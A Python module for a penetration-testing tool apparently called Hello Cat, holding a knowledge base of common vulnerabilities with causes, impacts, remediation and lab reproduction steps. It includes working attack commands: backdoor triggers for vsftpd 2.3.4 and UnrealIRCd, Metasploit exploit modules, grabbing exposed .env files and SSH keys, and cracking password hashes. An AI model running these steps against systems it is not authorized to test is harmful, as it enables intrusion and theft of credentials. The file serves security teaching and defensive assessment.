"""Vulnerability knowledge base for Hello Cat.

Maps short vulnerability IDs (referenced by vuln_check.py, port_scanner.py,
tech_fingerprint.py and dir_enum.py) to detailed, lab-oriented write-ups:
what it is, why it exists, its impact, how to validate it, step-by-step
reproduction, relevant tools/commands, and remediation.

This is reference material for *authorized* lab environments (TryHackMe,
CTF ranges, your own infrastructure) - reproduction steps are intended to
be run only against targets you are permitted to test.
"""

VULN_DB = {
    "anon_ftp": {
        "title": "Anonymous FTP Login Allowed",
        "cause": "The FTP server is configured to accept the 'anonymous' "
                 "username with any (or blank) password, often left on by "
                 "default or enabled for convenience during setup.",
        "impact": "An unauthenticated attacker can list, download, and "
                   "sometimes upload files on the FTP server, potentially "
                   "exposing sensitive files, backups, or credentials, or "
                   "planting malicious files if write access is also open.",
        "validation": "Confirm by connecting and logging in as 'anonymous' "
                       "with any password - if the login succeeds and you can "
                       "run 'ls', the finding is confirmed.",
        "reproduction": [
            "ftp <target_ip>",
            "Username: anonymous",
            "Password: anonymous@ (or leave blank)",
            "Once connected, run: ls -la",
            "Try: get <filename> to download an accessible file",
            "Try: put test.txt to check for write access (read-only labs may reject this)",
        ],
        "tools": ["ftp", "lftp", "nmap --script ftp-anon", "Metasploit: auxiliary/scanner/ftp/anonymous"],
        "remediation": "Disable anonymous FTP access unless explicitly required. "
                        "If anonymous access is needed for public file distribution, "
                        "restrict it to a dedicated read-only directory with no write "
                        "permissions and no sensitive files.",
    },
    "smb_exposed": {
        "title": "SMB Service Exposed (139/445)",
        "cause": "SMB file-sharing ports are reachable from the network, "
                 "which is common on Windows hosts and Samba-based Linux "
                 "services but increases attack surface if not firewalled.",
        "impact": "Exposed SMB can allow null-session enumeration of users, "
                   "groups, and shares, access to misconfigured shares, and "
                   "in vulnerable versions, remote code execution (e.g. "
                   "EternalBlue / MS17-010, SambaCry / CVE-2017-7494).",
        "validation": "Enumerate shares and check for null-session access; "
                       "run a vulnerability-specific nmap script to check for "
                       "known SMB CVEs.",
        "reproduction": [
            "smbclient -L //<target_ip>/ -N      # list shares with no auth",
            "enum4linux -a <target_ip>            # full enumeration",
            "nmap --script smb-vuln* -p 139,445 <target_ip>",
            "smbmap -H <target_ip>                # share permissions overview",
        ],
        "tools": ["smbclient", "enum4linux", "smbmap", "nmap smb-vuln* scripts", "Metasploit smb modules"],
        "remediation": "Firewall SMB ports from untrusted networks, disable "
                        "SMBv1, require authentication for all shares, apply "
                        "vendor patches for known SMB CVEs, and disable null "
                        "sessions.",
    },
    "risky_http_methods": {
        "title": "Risky HTTP Methods Enabled (PUT/DELETE/TRACE)",
        "cause": "The web server or application is configured to accept "
                 "HTTP methods beyond GET/POST/HEAD, often left enabled by "
                 "default web server configs or misconfigured WebDAV.",
        "impact": "PUT/DELETE can allow uploading or deleting arbitrary files "
                   "if write access isn't restricted, potentially leading to "
                   "remote code execution (e.g. uploading a web shell). TRACE "
                   "can be abused for Cross-Site Tracing (XST) to steal cookies "
                   "in combination with XSS.",
        "validation": "Send an OPTIONS request and inspect the Allow header; "
                       "then attempt a PUT with a harmless test file.",
        "reproduction": [
            "curl -i -X OPTIONS http://<target_ip>/",
            "curl -i -X PUT -d 'test' http://<target_ip>/test.txt",
            "curl -i -X GET http://<target_ip>/test.txt   # confirm if it was written",
            "curl -i -X TRACE http://<target_ip>/          # check for reflected request",
        ],
        "tools": ["curl", "Burp Suite (Repeater)", "nmap --script http-methods"],
        "remediation": "Disable unused HTTP methods at the web server/app "
                        "level (e.g. <LimitExcept GET POST> in Apache), disable "
                        "WebDAV unless required, and disable TRACE support.",
    },
    "missing_security_headers": {
        "title": "Missing Security Headers",
        "cause": "The web server/application does not set hardening headers "
                  "such as Content-Security-Policy, X-Frame-Options, "
                  "X-Content-Type-Options, or Strict-Transport-Security.",
        "impact": "Missing headers increase exposure to clickjacking "
                   "(no X-Frame-Options/CSP frame-ancestors), MIME-sniffing "
                   "attacks (no X-Content-Type-Options), and protocol "
                   "downgrade/SSL-stripping attacks (no HSTS). Severity is "
                   "generally low on its own but compounds with other issues.",
        "validation": "Inspect response headers for the presence/absence of "
                       "each hardening header.",
        "reproduction": [
            "curl -I http://<target_ip>/",
            "Look for: Content-Security-Policy, X-Frame-Options, "
            "X-Content-Type-Options, Strict-Transport-Security",
            "Confirm clickjacking risk by embedding the page in an <iframe> "
            "on a test page if X-Frame-Options/CSP frame-ancestors is absent",
        ],
        "tools": ["curl", "Browser DevTools (Network tab)", "securityheaders.com (for internet-facing sites)"],
        "remediation": "Add appropriate headers at the web server or "
                        "application layer, e.g. "
                        "'X-Content-Type-Options: nosniff', "
                        "'X-Frame-Options: DENY', a restrictive "
                        "Content-Security-Policy, and HSTS for HTTPS sites.",
    },
    "default_creds_panel": {
        "title": "Login Panel Exposed with Possible Default Credentials",
        "cause": "An administrative or application login panel (e.g. "
                  "phpMyAdmin, WordPress wp-login, cPanel) is reachable and "
                  "may still be using default or weak vendor credentials.",
        "impact": "If default/weak credentials work, an attacker gains "
                   "administrative access to the application or database, "
                   "which often leads to full compromise (e.g. plugin upload "
                   "-> RCE in WordPress, or SQL execution via phpMyAdmin).",
        "validation": "Attempt common default credential pairs for the "
                       "specific panel found (only in an authorized lab) and "
                       "check for lockout/rate limiting.",
        "reproduction": [
            "Identify the panel type (wp-login.php, phpMyAdmin, cPanel, etc.)",
            "Check for default creds, e.g. admin:admin, root:(blank), "
            "root:root, admin:password",
            "For WordPress: wpscan --url http://<target_ip> --enumerate u "
            "to find valid usernames first",
            "If a lab provides credentials/hints, try those before brute-forcing",
        ],
        "tools": ["Browser", "Burp Suite Intruder", "wpscan (WordPress)", "hydra (generic form brute-force)"],
        "remediation": "Change all default credentials immediately after "
                        "installation, enforce strong password policies, add "
                        "rate limiting/account lockout, and restrict admin "
                        "panels to trusted IP ranges or VPN access.",
    },
    "vsftpd_backdoor": {
        "title": "vsftpd 2.3.4 Backdoor (CVE-2011-2523)",
        "cause": "A malicious backdoor was injected into the vsftpd 2.3.4 "
                 "source distribution between June 30 and July 1, 2011, "
                 "triggered by sending a username containing ':)' to the "
                 "FTP service.",
        "impact": "CRITICAL - triggering the backdoor opens a root shell on "
                   "TCP port 6200, giving an attacker unauthenticated remote "
                   "code execution as root.",
        "validation": "Confirm the banner reports vsftpd 2.3.4, then attempt "
                       "the known trigger sequence in the lab.",
        "reproduction": [
            "nc <target_ip> 21",
            "USER test:)",
            "PASS anything",
            "In a new terminal: nc <target_ip> 6200   # should drop into a root shell",
            "(Metasploit: use exploit/unix/ftp/vsftpd_234_backdoor)",
        ],
        "tools": ["netcat", "Metasploit (vsftpd_234_backdoor module)"],
        "remediation": "Upgrade vsftpd to a clean, non-backdoored version "
                        "immediately; verify package integrity/checksums for "
                        "any software installed from third-party mirrors.",
    },
    "proftpd_backdoor": {
        "title": "ProFTPD 1.3.3c Backdoor",
        "cause": "The ProFTPD 1.3.3c source tarball distributed from certain "
                 "mirrors between Nov 28 - Dec 2, 2010 contained an injected "
                 "backdoor in response to a specific command sequence.",
        "impact": "CRITICAL - allows unauthenticated remote command execution.",
        "validation": "Confirm the banner/version via nmap -sV, then check "
                       "known backdoor command sequences for this build in "
                       "the lab.",
        "reproduction": [
            "nmap -sV -p 21 <target_ip>   # confirm ProFTPD 1.3.3c",
            "(Metasploit: use exploit/unix/ftp/proftpd_133c_backdoor)",
        ],
        "tools": ["nmap", "Metasploit"],
        "remediation": "Upgrade to an official, verified ProFTPD release and "
                        "verify package checksums.",
    },
    "old_openssh": {
        "title": "Outdated OpenSSH Version",
        "cause": "An older OpenSSH version is in use, which may be missing "
                  "patches for known vulnerabilities (e.g. user enumeration, "
                  "auth bypass, or specific CVEs tied to that version range).",
        "impact": "Varies by version - can range from username enumeration "
                   "to authentication bypass or memory-corruption bugs; "
                   "check the exact version against CVE databases.",
        "validation": "Identify the exact version via banner grab, then "
                       "cross-reference with CVE databases for that version.",
        "reproduction": [
            "nmap -sV -p 22 <target_ip>",
            "ssh -V  <target_ip>  (or: nc <target_ip> 22)",
            "searchsploit openssh <version>",
        ],
        "tools": ["nmap", "nc", "searchsploit"],
        "remediation": "Upgrade OpenSSH to the latest stable version "
                        "supported by the OS, and subscribe to security "
                        "advisories for the distribution in use.",
    },
    "old_samba": {
        "title": "Outdated Samba Version",
        "cause": "An old Samba 3.x build is running, several versions of "
                 "which are vulnerable to remote code execution flaws such "
                 "as SambaCry (CVE-2017-7494) or older 'username map script' "
                 "issues (CVE-2007-2447).",
        "impact": "CRITICAL to HIGH - several Samba 3.x CVEs allow remote "
                   "code execution as root via a writable share.",
        "validation": "Confirm version via nmap/banner, check writable "
                       "shares, then test against the matching Metasploit "
                       "module for the identified CVE.",
        "reproduction": [
            "nmap -sV -p 139,445 <target_ip>",
            "smbclient -L //<target_ip>/ -N",
            "(Metasploit: use exploit/multi/samba/usermap_script, or "
            "exploit/linux/samba/is_known_pipename for SambaCry)",
        ],
        "tools": ["nmap", "smbclient", "Metasploit"],
        "remediation": "Upgrade Samba to a patched version, disable the "
                        "'username map script' option if unused, and disable "
                        "guest/writable shares that aren't required.",
    },
    "old_apache": {
        "title": "Outdated Apache HTTP Server",
        "cause": "An old Apache 2.2.x/2.4.x build is in use, which may lack "
                  "patches for known CVEs in that version range.",
        "impact": "Varies by CVE - can include information disclosure, "
                   "denial of service, or in some module combinations, "
                   "remote code execution.",
        "validation": "Identify the exact version from the Server header, "
                       "then cross-reference with CVE databases.",
        "reproduction": [
            "curl -I http://<target_ip>/",
            "nmap -sV -p 80,443 <target_ip>",
            "searchsploit apache <version>",
        ],
        "tools": ["curl", "nmap", "searchsploit"],
        "remediation": "Upgrade Apache to the latest stable release for the "
                        "distribution and disable unused modules.",
    },
    "iis6": {
        "title": "IIS 6.0 Remote Code Execution (CVE-2017-7269)",
        "cause": "IIS 6.0 (shipped with Windows Server 2003) contains a "
                  "buffer overflow in the WebDAV service's ScStoragePathFromUrl "
                  "function, triggered via a crafted PROPFIND request with an "
                  "'If: <http://' header.",
        "impact": "CRITICAL - unauthenticated remote code execution.",
        "validation": "Confirm IIS 6.0 via the Server header, then test the "
                       "known exploit in the lab.",
        "reproduction": [
            "curl -I http://<target_ip>/   # confirm 'Server: Microsoft-IIS/6.0'",
            "(Metasploit: use exploit/windows/iis/iis_webdav_scstoragepathfromurl)",
        ],
        "tools": ["curl", "Metasploit"],
        "remediation": "Upgrade off Windows Server 2003/IIS 6.0, which is "
                        "end-of-life and unsupported; disable WebDAV if the "
                        "OS cannot be upgraded immediately.",
    },
    "unrealircd_backdoor": {
        "title": "UnrealIRCd Backdoor (CVE-2010-2075)",
        "cause": "A trojanized version of UnrealIRCd 3.2.8.1 was distributed "
                 "from the official download server after a compromise, "
                 "containing a backdoor command handler.",
        "impact": "CRITICAL - sending a specific string to the IRC port "
                   "executes arbitrary shell commands with the privileges of "
                   "the IRC daemon.",
        "validation": "Confirm UnrealIRCd service/version, then test the "
                       "backdoor trigger string in the lab.",
        "reproduction": [
            "nmap -sV -p 6667 <target_ip>",
            "nc <target_ip> 6667",
            "AB; <shell_command>   # backdoor trigger prefix",
            "(Metasploit: use exploit/unix/irc/unreal_ircd_3281_backdoor)",
        ],
        "tools": ["nmap", "netcat", "Metasploit"],
        "remediation": "Replace with a clean, verified UnrealIRCd build "
                        "from an official, checksum-verified source.",
    },
    "outdated_php": {
        "title": "Outdated / End-of-Life PHP Version",
        "cause": "The application is running on a PHP version that no "
                  "longer receives security updates.",
        "impact": "Unpatched PHP versions may be vulnerable to known RCE, "
                   "deserialization, or memory-corruption CVEs, and third-party "
                   "frameworks built on them inherit the risk.",
        "validation": "Identify the PHP version via headers (X-Powered-By), "
                       "error messages, or phpinfo() if exposed.",
        "reproduction": [
            "curl -I http://<target_ip>/ | grep -i x-powered-by",
            "Check /phpinfo.php or /info.php if present",
            "searchsploit php <version>",
        ],
        "tools": ["curl", "searchsploit"],
        "remediation": "Upgrade to a supported PHP version and remove any "
                        "exposed phpinfo()/debug endpoints from production.",
    },
    "outdated_openssl": {
        "title": "Outdated OpenSSL (Possible Heartbleed or related CVEs)",
        "cause": "An old OpenSSL version is reported in the service banner, "
                 "potentially including versions vulnerable to Heartbleed "
                 "(CVE-2014-0160) or other memory-safety issues.",
        "impact": "CRITICAL for Heartbleed-affected versions - allows "
                   "reading server process memory remotely, potentially "
                   "leaking private keys, session tokens, or credentials.",
        "validation": "Confirm the OpenSSL version, then test specifically "
                       "for Heartbleed in the lab using a dedicated script.",
        "reproduction": [
            "nmap -sV --script ssl-heartbleed -p 443 <target_ip>",
            "(or) testssl.sh <target_ip>:443",
        ],
        "tools": ["nmap ssl-heartbleed script", "testssl.sh"],
        "remediation": "Upgrade OpenSSL to a patched version and rotate any "
                        "private keys/certificates that may have been exposed.",
    },
    "exposed_git": {
        "title": "Exposed .git Directory",
        "cause": "The web server serves the project's .git directory "
                  "(version control metadata), usually because the deploy "
                  "process copied the whole repo into the webroot.",
        "impact": "HIGH - the entire commit history, including past source "
                   "code, config files, and sometimes hardcoded secrets that "
                   "were later removed, can be reconstructed.",
        "validation": "Confirm /.git/config is accessible, then attempt to "
                       "dump the repository.",
        "reproduction": [
            "curl http://<target_ip>/.git/config",
            "git-dumper http://<target_ip>/.git/ ./dumped_repo   # or use githack/GitTools",
            "cd dumped_repo && git log --all",
        ],
        "tools": ["curl", "git-dumper", "GitTools (gitdumper.sh, extractor.sh)"],
        "remediation": "Remove .git from the deployed webroot, block access "
                        "to dotfiles/dotdirectories at the web server level, "
                        "and rotate any secrets ever committed to the repo.",
    },
    "exposed_env": {
        "title": "Exposed .env File",
        "cause": "The application's environment configuration file "
                  "(commonly used by frameworks like Laravel, Django, Node) "
                  "is served directly instead of being blocked.",
        "impact": "CRITICAL - .env files typically contain database "
                   "credentials, API keys, secret keys, and third-party "
                   "service tokens.",
        "validation": "Request the file directly and check for key=value "
                       "pairs in the response.",
        "reproduction": [
            "curl http://<target_ip>/.env",
            "Look for DB_PASSWORD, API_KEY, SECRET_KEY, AWS_* entries",
        ],
        "tools": ["curl"],
        "remediation": "Block access to dotfiles at the web server level, "
                        "never deploy .env inside the public webroot, and "
                        "rotate any credentials that were exposed.",
    },
    "exposed_htpasswd": {
        "title": "Exposed .htpasswd File",
        "cause": "The .htpasswd credential file used for HTTP Basic "
                  "Authentication is reachable over the web.",
        "impact": "HIGH - contains hashed credentials that can be cracked "
                   "offline (often weak hash types like crypt/MD5 are used).",
        "validation": "Request the file and confirm it contains "
                       "username:hash pairs.",
        "reproduction": [
            "curl http://<target_ip>/.htpasswd",
            "john --wordlist=rockyou.txt htpasswd_hashes.txt",
            "(or) hashcat -m 1600 htpasswd_hashes.txt rockyou.txt",
        ],
        "tools": ["curl", "john the ripper", "hashcat"],
        "remediation": "Store .htpasswd outside the webroot and block "
                        "dotfile access at the web server level.",
    },
    "exposed_private_key": {
        "title": "Exposed Private SSH Key",
        "cause": "A private key file (e.g. id_rsa) was left inside the "
                  "web-accessible directory, often from a forgotten backup "
                  "or misconfigured deployment.",
        "impact": "CRITICAL - an attacker can use the key to authenticate "
                   "to SSH (or other services) as whichever account the key "
                   "belongs to, without needing a password.",
        "validation": "Download the key, check its permissions/format, and "
                       "attempt SSH authentication if an associated username "
                       "is known or guessable.",
        "reproduction": [
            "curl http://<target_ip>/id_rsa -o id_rsa",
            "chmod 600 id_rsa",
            "ssh -i id_rsa <possible_user>@<target_ip>",
            "If passphrase-protected: ssh2john id_rsa > hash.txt && john hash.txt",
        ],
        "tools": ["curl", "ssh", "ssh2john", "john the ripper"],
        "remediation": "Remove private keys from any web-accessible "
                        "location, rotate the compromised key pair, and audit "
                        "deployment processes for accidental key inclusion.",
    },
    "exposed_backup_sql": {
        "title": "Exposed Database Backup File",
        "cause": "A .sql backup file was left in a web-accessible "
                  "directory, usually from a manual or automated backup "
                  "process that wasn't cleaned up.",
        "impact": "HIGH to CRITICAL - database dumps often contain user "
                   "credentials (hashed or plaintext), personal data, and "
                   "application secrets.",
        "validation": "Download the file and inspect its contents for "
                       "credential tables or sensitive data.",
        "reproduction": [
            "curl http://<target_ip>/backup.sql -o backup.sql",
            "grep -i 'password\\|email\\|secret' backup.sql",
        ],
        "tools": ["curl", "grep"],
        "remediation": "Never store backups inside the webroot, restrict "
                        "backup directories to internal networks only, and "
                        "rotate exposed credentials.",
    },
    "phpinfo_exposed": {
        "title": "phpinfo() Page Exposed",
        "cause": "A debug/test file calling phpinfo() was left accessible "
                  "in production.",
        "impact": "MEDIUM - leaks detailed server configuration (PHP "
                   "version, loaded modules, file paths, sometimes "
                   "environment variables) that aids further exploitation.",
        "validation": "Load the page directly and confirm it renders the "
                       "standard phpinfo() table output.",
        "reproduction": [
            "curl http://<target_ip>/phpinfo.php",
            "Review disclosed paths, modules, and config values for further leads",
        ],
        "tools": ["curl", "browser"],
        "remediation": "Remove phpinfo() debug files from production "
                        "deployments entirely.",
    },
    "server_status_exposed": {
        "title": "Apache server-status Exposed",
        "cause": "The mod_status module's /server-status endpoint was left "
                  "enabled and accessible to all clients instead of being "
                  "restricted to localhost/internal IPs.",
        "impact": "MEDIUM - reveals active requests, client IPs, and "
                   "requested URLs in real time, which can leak session "
                   "tokens in URLs or internal application structure.",
        "validation": "Load the endpoint and confirm it shows live request "
                       "data.",
        "reproduction": [
            "curl http://<target_ip>/server-status",
            "Refresh repeatedly to observe live traffic if the app is active",
        ],
        "tools": ["curl", "browser"],
        "remediation": "Restrict /server-status to localhost or trusted "
                        "internal IPs via Apache config, or disable mod_status "
                        "in production.",
    },
    "actuator_health_exposed": {
        "title": "Spring Boot Actuator Endpoint Exposed",
        "cause": "Spring Boot Actuator endpoints were left enabled and "
                  "publicly accessible without authentication, often due to "
                  "default configuration being carried into production.",
        "impact": "MEDIUM to HIGH - depending on which actuator endpoints "
                   "are exposed (env, heapdump, mappings), this can leak "
                   "environment variables/secrets or, in some configurations, "
                   "enable remote code execution via /actuator/jolokia or "
                   "similar.",
        "validation": "Check which actuator endpoints are reachable beyond "
                       "/health.",
        "reproduction": [
            "curl http://<target_ip>/actuator",
            "curl http://<target_ip>/actuator/env",
            "curl http://<target_ip>/actuator/heapdump -o heapdump.bin",
        ],
        "tools": ["curl"],
        "remediation": "Disable or authenticate sensitive actuator "
                        "endpoints in production (management.endpoints.web."
                        "exposure.include), and never expose env/heapdump "
                        "publicly.",
    },
}


def get_detail(vuln_id):
    """Return the detailed write-up dict for a vuln_id, or None if unknown."""
    return VULN_DB.get(vuln_id)
